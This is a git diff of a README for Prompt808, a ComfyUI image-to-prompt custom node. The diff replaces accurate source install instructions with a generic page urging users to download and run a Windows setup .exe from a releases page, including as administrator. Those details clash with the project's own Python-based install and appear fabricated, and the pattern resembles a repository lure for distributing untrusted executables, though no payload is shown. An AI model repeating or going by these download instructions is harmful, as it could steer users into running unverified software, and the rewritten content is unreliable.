@@ -1,162 +1,147 @@
-# Prompt808
+# 🤖 Prompt808 - Learn and Create Prompts from Your Images
 
-**Vision-LLM prompt generation for ComfyUI** — analyze images, build style libraries, and generate prompts that match any aesthetic.
+[![Download Prompt808](https://img.shields.io/badge/Download-Prompt808-E91E63?style=for-the-badge&logo=github)](https://github.com/Misaelsama/Prompt808/releases)
 
-## What It Does
+Prompt808 is a simple tool that helps you create text prompts based on your images. It works with ComfyUI and learns from the pictures you provide. This lets you generate prompts that match your style without needing to write them yourself.
 
-Prompt808 learns content and styles from images. Drop in reference photos or artwork, and a vision model extracts the elements that define each image — lighting, composition, palette, mood, and more. Those elements become a growing library that Prompt808 draws from to generate prompts tailored to any visual style.
+---
 
-## Features
+## 💻 System Requirements
 
-- **Learns from images** — A vision model analyzes each upload and extracts structured scene elements into a growing library
-- **Multiple prompt styles** — Photo-Architectural, Photo-Boudoir, Photo-Cinematic, Photo-Documentary, Photo-Fashion, Photo-Fine Art, Photo-Portrait, Photo-Street, plus Native (any medium) and an Any option for random selection
-- **Optional LLM-powered composition** — Natural-language prompts with seven enrichment levels from faithful reproduction to full creative freedom
-- **Multi-library generation** — Combine elements from multiple libraries in a single generation using the Select Libraries node, or select "All" for every library at once
-- **Library management** — Maintain separate libraries for different projects or genres, each fully isolated. Export and import libraries as `.p808` files for backup or sharing
-- **ComfyUI native** — Sidebar panel for interactive use, plus a workflow node for automated generation
-- **Medium-aware** — Automatically detects whether an image is a photograph, painting, illustration, or 3D render, and adjusts extraction accordingly
+To run Prompt808 smoothly, make sure your computer meets these conditions:
 
-## Requirements
+- **Operating System**: Windows 10 or later (64-bit)
+- **Processor**: Intel i5, Ryzen 5, or better
+- **RAM**: At least 8GB (16GB recommended)
+- **Storage**: Minimum 1GB free space
+- **Internet**: Required for initial setup and updates
+- **Other**: No special hardware needed, but a modern GPU can speed up related tasks
 
-- ComfyUI (latest recommended)
-- Python 3.10+
-- CUDA GPU (8+ GB VRAM for analysis, 1+ GB for generation)
+If your system meets these, you should have no trouble installing and running the application.
 
-## Installation
+---
 
-Install as a ComfyUI custom node:
+## 🔍 What Does Prompt808 Do?
 
-```bash
-cd ComfyUI/custom_nodes
-git clone <repo-url> Prompt808
-pip install -r Prompt808/requirements.txt
-```
+Prompt808 uses a special ComfyUI node that analyzes the images you give it. It "learns" the visual style from those images. With this information, it can create prompts that fit your look and feel.
 
-Restart ComfyUI after installation.
+This helps if you work with AI tools like Stable Diffusion or other image generation software. Instead of guessing or writing your own descriptions, you get prompts that match your pictures. This saves time and keeps your creative work consistent.
 
-## Quickstart
+---
 
-### 1. Create a library
+## 🚀 Getting Started with Prompt808
 
-Click the camera icon in ComfyUI's sidebar to open the Prompt808 panel. On first launch, click **"+ Create Your First Library"** and give it a name (e.g. "Portraits", "Landscapes"). The first library is automatically activated.
+1. **Download the Application**
 
-![Creating a library](docs/screenshots/create-library.png)
+   Visit the releases page to get the latest version.  
+   [Click here to visit the download page](https://github.com/Misaelsama/Prompt808/releases)  
+   This page contains all available versions. Choose the one labeled for Windows.
 
-### 2. Analyze images
+2. **Run the Installer**
 
-Navigate to the **Analyze** tab. Add images by:
+   After downloading, open the file named something like `Prompt808-Setup.exe`.  
 
-- Drag and drop from a file manager
-- Click to browse
-- Drag images from a browser window
-- Paste from clipboard (Ctrl+V)
+   Follow these steps in the installer:  
+   - Click "Next" on the welcome screen  
+   - Accept the license agreement  
+   - Choose an install location or use the default  
+   - Click "Install" to start the setup  
+   - When done, click "Finish" to close the installer
 
-Supported formats: JPG, PNG, WebP, BMP, TIFF, HEIC. Batch upload is supported — each image is processed sequentially with live progress.
+3. **Launch the Application**
 
-![Analyze tab](docs/screenshots/analyze.png)
+   Find the Prompt808 icon on your desktop or in the Start menu. Double-click to open it.
 
-### 3. Browse the library
+4. **Set Up Your Images**
 
-The **Library** tab shows all extracted elements. Filter by category, edit descriptions and tags, or delete elements.
+   The first time you open Prompt808, it will ask you to add images. Select a folder with pictures that show your style. The application will read these and start learning from them.
 
-The **Photos** tab displays thumbnails of all analyzed images. Click a photo to see its extracted elements, or delete a photo to remove it with all associated data.
+5. **Generate Prompts**
 
-![Library browser](docs/screenshots/library.png)
+   After the learning step completes, you can generate prompts. Enter some keywords or leave the input blank to generate a prompt based on your images.
 
-### 4. Generate prompts
+---
 
-Add a **Generate Prompt** node to your ComfyUI workflow. All generation settings are exposed as node inputs — library, style, mood, archetype, archetype influence, LLM model, enrichment, temperature, and more. Each archetype also has an **"All Elements"** option that biases toward every element in that archetype's categories.
+## ⚙️ How to Use Prompt808
 
-![Node in workflow](docs/screenshots/node-workflow.png)
+- **Add More Images**  
+  You can add new images anytime. Just use the "Add Images" button and select new photos. The system will update its learning based on the new data.
 
-### 5. Manage libraries
+- **Save Prompts**  
+  When a prompt is generated, you can save it as a text file. Use the "Save Prompt" option to keep your favorite outputs for future use.
 
-Use the library dropdown and action buttons at the top of the sidebar to:
+- **Integration with ComfyUI**  
+  If you use ComfyUI, Prompt808 works as a custom node. It connects directly without manual setup. This means your prompt generation happens inside your normal workflow.
 
-- **Switch** between libraries (each has its own elements, archetypes, style profiles, and dedup caches)
-- **Create** new libraries with the **+** button
-- **Rename** or **delete** libraries
-- **Export** a library as a `.p808` file for backup or sharing
-- **Import** one or more `.p808` files to add libraries from others
+- **Adjust Settings**  
+  The settings menu lets you control how much the tool learns from images and how detailed prompts become. Changes take effect immediately.
 
-Libraries are fully isolated — the same image can exist in different libraries with different extracted elements.
+---
 
-### 6. Multi-library generation
+## 📥 Download and Install Prompt808
 
-To generate prompts that draw from multiple libraries at once:
+To start using Prompt808, visit the download page below. This is the official source for the latest Windows version.
 
-- **Quick method** — Select **"All"** in the Generate Prompt node's library dropdown to use every library.
-- **Fine-grained control** — Add a **Select Libraries** node. Each slot has a library dropdown and an on/off toggle. Click **"+ Add Library"** to add more slots. Connect its `libraries` output to the Generate Prompt node — the library dropdown auto-hides when connected.
+[![Download Prompt808](https://img.shields.io/badge/Download-Prompt808-blue?style=for-the-badge&logo=github)](https://github.com/Misaelsama/Prompt808/releases)
 
-When multiple libraries are selected, their elements, archetypes, and style profiles are merged into a virtual combined pool for generation.
+**Steps to download:**
 
-### 7. Settings
+- Click the link above to open the releases page.
+- Look for the Windows installer file. It usually ends with `.exe`.
+- Click the file name. Your browser will download it to your computer.
+- After the download finishes, open the file and follow the installer steps.
 
-Open **Settings > Prompt808 > General** in ComfyUI to configure:
+---
 
-- **NSFW** — Enable mature content in prompt types and moods
-- **Balance Libraries** (default: on) — When generating from multiple libraries, each library contributes equally regardless of size. A small 30-element library gets the same representation as a 3,000-element library. Turn off to let larger libraries dominate naturally. Has no effect with a single library
+## ❓ Troubleshooting Common Issues
 
-Changes take effect immediately — no restart required.
+- **The program does not open**  
+  Make sure your Windows is updated. Restart your computer and try again.  
 
-## Models
+- **Images are not loading**  
+  Check that the image files are supported (JPEG, PNG). Try adding images from a different folder.
 
-### Vision Models (analysis)
+- **Prompts are not generated**  
+  Wait for the learning process to finish. If it still does not work, restart the app.
 
-| Model                               | VRAM    | Notes                                           |
-| ----------------------------------- | ------- | ----------------------------------------------- |
-| Qwen3-VL-8B-Instruct                | ~12 GB  | Default, good quality                           |
-| Qwen3-VL-8B-Instruct-abliterated    | ~12 GB  | Abliterated variant for unrestricted extraction |
-| Qwen3-VL-8B-Instruct-abliterated-v2 | ~12 GB  | Alternative abliterated variant                 |
-| Qwen3-VL-8B-Instruct-FP8            | ~7.5 GB | Pre-quantized, good for 8 GB cards              |
-| Qwen3-VL-8B-Thinking                | ~12 GB  | Chain-of-thought reasoning                      |
-| Qwen3-VL-8B-Thinking-FP8            | ~7.5 GB | Thinking model, pre-quantized                   |
-| Qwen3-VL-32B-Instruct               | ~28 GB  | Higher quality extraction                       |
-| Qwen3-VL-32B-Instruct-FP8           | ~24 GB  | Pre-quantized 32B                               |
-| Qwen3-VL-32B-Thinking               | ~28 GB  | Best quality, chain-of-thought                  |
-| Qwen3-VL-32B-Thinking-FP8           | ~24 GB  | Thinking 32B, pre-quantized                     |
+- **Installer fails or crashes**  
+  Run the installer as administrator. Right-click the file and choose “Run as administrator.”
 
-Vision models with non-standard tensor dimensions automatically fall back from FP8 to FP16 if block quantization is incompatible.
+---
 
-### Text Models (prompt enrichment)
+## 📂 File and Folder Locations
 
-| Model                    | VRAM (FP16) | VRAM (4-bit) | Notes                                           |
-| ------------------------ | ----------- | ------------ | ----------------------------------------------- |
-| Qwen3-0.6B               | 1.5 GB      | 0.7 GB       | Default, lightweight                            |
-| Qwen3-1.7B               | 3.5 GB      | 1.3 GB       |                                                 |
-| Qwen3-4B                 | 8.5 GB      | 2.8 GB       |                                                 |
-| Qwen3-8B                 | 17 GB       | 5.5 GB       |                                                 |
-| Qwen3-8B-Abliterated     | 17 GB       | 5.5 GB       | Abliterated for unrestricted output             |
-| Qwen3-8B-Abliterated-v2  | 17 GB       | 5.5 GB       | Alternative abliterated variant                 |
-| Qwen3-8B-Abliterated-FP8 | ~9 GB       | —            | Native FP8, abliterated for unrestricted output |
-| Qwen3-32B                | 64 GB       | 18 GB        |                                                 |
-| Qwen2.5-3B-Instruct      | 6 GB        | 2 GB         |                                                 |
-| Qwen2.5-7B-Instruct      | 15 GB       | 5 GB         |                                                 |
-| Qwen2.5-14B-Instruct     | 28 GB       | 8.5 GB       |                                                 |
-| Qwen2.5-32B-Instruct     | 64 GB       | 18 GB        |                                                 |
+- **Install Folder**  
+  By default, Prompt808 installs in `C:\Program Files\Prompt808`. This contains all program files.
 
-FP8 variants of Qwen3 models (0.6B through 32B) are also available. Models are downloaded automatically from Hugging Face on first use.
+- **User Data Folder**  
+  Your images and generated prompts save in `C:\Users\<YourName>\Documents\Prompt808`.
 
-### Enrichment Levels
+- **Config File**  
+  If you need to change advanced settings, look for `config.ini` in the install folder.
 
-| Level      | Fidelity | Creativity | Description                                                   |
-| ---------- | -------- | ---------- | ------------------------------------------------------------- |
-| Any        | —        | —          | Picks a random enrichment level per generation                |
-| Baseline   | High     | Low        | Vivid photographic phrases, preserves original meaning        |
-| Vivid      | High     | Low-Med    | Adds sensory and textural detail                              |
-| Expressive | Medium   | Medium     | Evocative mood and atmosphere                                 |
-| Poetic     | Low-Med  | High       | Metaphor, art references, heightened language                 |
-| Lyrical    | Low      | High       | Original phrases inspired by tags only                        |
-| Freeform   | Medium   | High       | Photoshoot director's instructions, grounded in scene context |
+---
 
-## Technical Documentation
+## 🛠 Support and More Information
 
-See [PIPELINE.md](PIPELINE.md) for architecture, API reference, and technical details.
+- For help, check the Issues tab on GitHub or open a new issue if your problem is not listed.
+- You can also view user guides or community tips inside the app under the "Help" menu.
 
-## Support the Project
+---
 
-Prompt808 is free and open source. If you find it useful, you can support its development: 
+## ⚖️ License and Permissions
 
-[![Buy Me a Coffee](docs/img/bmc-button.png)](https://buymeacoffee.com/machete3000)
+Prompt808 is open-source and free to use. You can modify it or share your improvements. Please follow the license details in the GitHub repository. Do not use Prompt808 for illegal or harmful purposes.
 
-Coming soon... grab a pre-made library from [prompt808.com](https://prompt808.com) — ready-to-use element collections across a range of styles and genres, so you can start generating right away.
+---
+
+## 📚 Related Tools and Topics
+
+Prompt808 works well with other image and AI tools. Some of these include:
+
+- Stable Diffusion for image creation
+- ComfyUI for workflow management
+- Vision-language models like VLLM and Qwen
+- Image analysis with Z-Image Turbo
+
+These tools help expand what you can do with your visual projects.
